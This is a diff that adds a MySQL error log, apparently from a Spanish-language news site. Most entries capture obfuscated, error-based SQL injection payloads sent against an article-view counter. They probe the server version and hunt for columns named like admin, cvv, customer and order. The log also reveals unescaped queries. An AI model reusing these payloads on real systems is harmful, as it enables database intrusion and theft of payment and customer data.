@@ -1,0 +1,47 @@
+Time : 17:37:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2561646d696e25)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 17:37:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x2563767625)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 17:37:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x25637573746f6d657225)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 17:37:02
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!0!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(t./**/tAbLe_nAmE),0x217e21) /**/fRoM information_schema./**/sChEmAtA as d join information_schema./**/tAbLeS as t on t./**/tAbLe_sChEmA = d./**/sChEmA_NaMe join information_schema./**/cOlUmNs as c on c./**/tAbLe_sChEmA = d./**/sChEmA_NaMe and c./**/tAbLe_nAmE = t./**/tAbLe_nAmE /**/wHeRe not c./**/tAbLe_sChEmA in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**/sChEmA_NaMe = /**/dAtAbAsE() and c./**/cOlUmN_NaMe like 0x256f7264657225)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 17:36:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 17:36:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:30:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 13:33:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Chucky' Lozano, joven futbolista de los Tuzos del Pachuca y de la Selección Mex' at line 1
+Raw SQL : CALL insertar('deportes','','marquesina','PSV, Porto, Real y Schalke, tras un seleccionado mexicano','tuzo.jpg','
+
+De acuerdo con información publicada por el sitio holandés ‘SoccerNews’, varios equipos europeos ya habrían alzado la mano para una eventual contratación de Hirving 'Chucky' Lozano, joven futbolista de los Tuzos del Pachuca y de la Selección Mexicana.','','
+
+Tras su actuación ante Canadá, el Tricolor habría confirmado el interés de clubes como PSV de Holanda y la Real Sociedad de España, equipos que cuentan con elementos aztecas en sus filas como Andrés Guardado, Héctor Moreno, Diego Reyes y Carlos Vela.
+<p>
+Sin embargo, uno de los probables destinos para el atacante de 20 años sería el Porto de Portugal, donde ya militan Jesús Corona, Héctor Herrera y Miguel Layún; esta teoría sería reforzada por el rotativo Record, del país luso, que también aclaró que el jugador estaría tasado en 3.2 millones de euros. 
+<p>
+El club de la Bundesliga, Schalke 04 también sería uno de los clubes interesados en fichar a la estrella de Pachuca así como un equipo italiano que estaría siguiendo con atención los pasos de Lozano, quien podría disputar los Juegos Olímpicos de Río 2016 o la Copa América Centenario con el Tricolor.','','','','','','','','')
+
+Time : 00:37:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 00:37:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
